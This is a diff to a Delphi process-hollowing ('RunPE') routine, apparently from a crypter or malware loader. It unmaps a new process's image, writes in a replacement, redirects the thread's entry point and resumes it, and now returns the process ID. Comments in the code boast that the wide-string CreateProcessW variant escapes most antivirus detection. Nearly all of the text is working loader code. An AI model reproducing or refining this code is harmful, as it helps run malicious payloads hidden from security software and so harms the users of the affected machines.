@@ -93,6 +93,7 @@ var
   dwImageBase:  DWORD;
   pModule:      Pointer;
   dwNull:       DWORD;
+  dwThID:       DWORD;
   NTHandle:     HINST;
   Unmap:        UnmapProc;
   WriteProcess: WriteProc;
@@ -101,7 +102,7 @@ begin
 
   if Parameters <> '' then Parameters := '"'+FilePath+'" '+Parameters;
 
-  //Load NtUnmapViewOfSection
+  //Load NtUnmapViewOfSection and... THE MAGIC!
   NTHandle:=LoadLibrary('ntdll');
   if Not(NTHandle=0) then Begin
     Pointer(Unmap):=GetProcAddress(NTHandle, 'NtUnmapViewOfSection');
@@ -110,7 +111,8 @@ begin
   End;
   //Load Done
 
-  Result := 0;
+  Result:=0;
+  dwThID:=0;
   IDH := Buffer;
   if IDH^.e_magic = IMAGE_DOS_SIGNATURE then
   begin
@@ -120,7 +122,6 @@ begin
       FillChar(SI, SizeOf(TStartupInfoW), #0);
       FillChar(PI, SizeOf(TProcessInformation), #0);
       SI.cb := SizeOf(TStartupInfoW);
-      //This is the trick, right here!
       //CreateProcessW doesn't get detected by most AVs
       //Because Widestring versions of this trick aren't common.
       if CreateProcessW(PWideChar(WideString(FilePath)), PWideChar(WideString(Parameters)),
@@ -159,12 +160,13 @@ begin
               CT^.Eax := DWORD(pModule) + INH^.OptionalHeader.AddressOfEntryPoint;
               SetThreadContext(PI.hThread, CT^);
               ResumeThread(PI.hThread);
-              Result := PI.hThread;
+              dwThID:= PI.dwThreadId;
+              Result := PI.dwProcessId;
             end;
           end;
           VirtualFree(CTBase, 0, MEM_RELEASE);
         end;
-        if Result = 0 then
+        if dwThID = 0 then
           TerminateProcess(PI.hProcess, 0);
       end;
     end;
